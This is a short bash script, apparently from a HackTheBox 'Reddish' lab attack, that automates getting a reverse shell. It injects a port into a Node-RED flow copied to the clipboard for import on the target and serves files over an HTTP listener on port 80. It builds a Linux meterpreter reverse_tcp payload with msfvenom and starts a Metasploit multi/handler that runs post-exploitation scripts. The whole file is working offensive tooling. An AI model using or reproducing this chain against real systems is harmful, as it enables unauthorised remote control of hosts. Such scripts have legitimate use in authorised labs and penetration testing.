#!/bin/bash

cat meter-callback-12345.flow | sed "s/meter-rev-tcp-12345/meter-rev-tcp-$1/g" | xclip -sel clipboard
echo 
echo "Contents of meter-callback-12345.flow are in your clipboard"
echo 

echo "Browse here and import from clipboard:"
./generate-node-red-url.sh
echo

xterm -e 'cd /tmp && python3 -m http.server 80' &
echo "HTTP listener started"
echo 


xterm -e "cd /tmp && msfvenom -o meter-rev-tcp-$1 -f elf -p linux/x64/meterpreter/reverse_tcp LHOST=tun0
 LPORT=$1"
echo "Meterpreter payload created"
echo 

msfconsole -r <(echo "use multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set lhost tun0
set lport $1
set autorunscript multi_console_command -r /root/htb/reddish/post-exploit-scripts.rc
exploit -j
")

